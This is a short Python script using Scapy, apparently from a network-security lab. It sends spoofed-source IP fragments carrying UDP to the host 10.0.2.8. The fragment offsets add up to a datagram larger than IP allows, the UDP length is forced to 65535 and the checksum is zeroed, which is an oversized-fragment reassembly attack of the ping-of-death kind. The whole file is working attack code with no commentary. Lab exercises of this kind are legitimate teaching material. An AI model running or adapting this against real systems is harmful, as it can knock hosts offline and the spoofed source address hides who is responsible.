#!/usr/bin/python3
from scapy.all import *
import time

# Scapy Spoofing

ID = 1001
payload = "A" * 1200
payload3 = "B" * 700

## First Fragment

udp = UDP(sport=7070, dport=9090)
udp.len = 65535
ip = IP(src="1.2.3.4", dst="10.0.2.8") 
ip.id = ID
ip.frag = 0
ip.flags = 1
pkt = ip/udp/payload
pkt[UDP].chksum = 0
send(pkt,verbose=0)

## Second Fragment

offset = 151
for i in range(53):
	ip = IP(src="1.2.3.4", dst="10.0.2.8") 
	ip.id = ID
	ip.frag = offset + i * 150
	ip.flags = 1
	ip.proto = 17
	pkt = ip/payload
	send(pkt,verbose=0)

## Third Fragment

ip = IP(src="1.2.3.4", dst="10.0.2.8") 
ip.id = ID
ip.frag = 151 + 53 * 150
ip.flags = 0
ip.proto = 17
pkt = ip/payload3
send(pkt,verbose=0)

print("Finish Sending Packets!")

